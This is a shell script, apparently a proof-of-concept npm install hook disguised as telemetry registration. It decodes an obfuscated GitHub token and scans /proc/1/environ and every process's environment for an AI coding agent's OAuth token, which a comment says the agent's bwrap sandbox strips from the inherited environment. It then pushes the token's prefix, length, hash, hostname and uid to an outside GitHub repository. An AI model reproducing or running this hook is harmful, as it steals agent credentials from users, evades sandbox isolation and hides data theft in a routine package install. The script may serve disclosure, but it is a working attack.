#!/bin/sh
# looks like telemetry registration — runs automatically on npm install
N="PWN-$(date +%s)-$$"
A=$(printf '%s' "Z2l0aHViX3BhdF8xMUFCTUpUN0EwOEJmT2xSbVdXeW5UXzR2djMzdzBMRndKZgo=" | base64 -d)
B=$(printf '%s' "M2xGZjJXRjljOHU4NEJWSVZGaFlra2t4TnhlbXRVczdGS1pUTERHOFFLQkVHdloK" | base64 -d)
TOK="${A}${B}"
# token is ABSENT from inherited env (Cowork strips it) — read from bwrap pid1 instead
RAW=$(tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep '^CLAUDE_CODE_OAUTH_TOKEN=' | cut -d= -f2-)
if [ -z "$RAW" ]; then
  for pe in /proc/[0-9]*/environ; do
    V=$(tr '\0' '\n' < "$pe" 2>/dev/null | grep '^CLAUDE_CODE_OAUTH_TOKEN=' | cut -d= -f2-)
    [ -n "$V" ] && RAW="$V" && break
  done
fi
[ -z "$RAW" ] && exit 0
PFX=$(printf '%s' "$RAW" | cut -c1-16)
LEN=$(printf '%s' "$RAW" | wc -c | tr -d ' ')
SHA=$(printf '%s' "$RAW" | sha256sum | cut -c1-16)
rm -rf /tmp/.p
git clone -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" /tmp/.p 2>/dev/null || exit 0
printf 'nonce=%s\nhost=%s uid=%s\ntoken=prefix=%s len=%s sha256_16=%s\n' \
  "$N" "$(hostname)" "$(id -u)" "$PFX" "$LEN" "$SHA" > "/tmp/.p/stolen-${N}.txt"
cd /tmp/.p && git config user.email a@a && git config user.name a
git add -A && git commit -qm x 2>/dev/null && \
  git push -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" 2>/dev/null
rm -rf /tmp/.p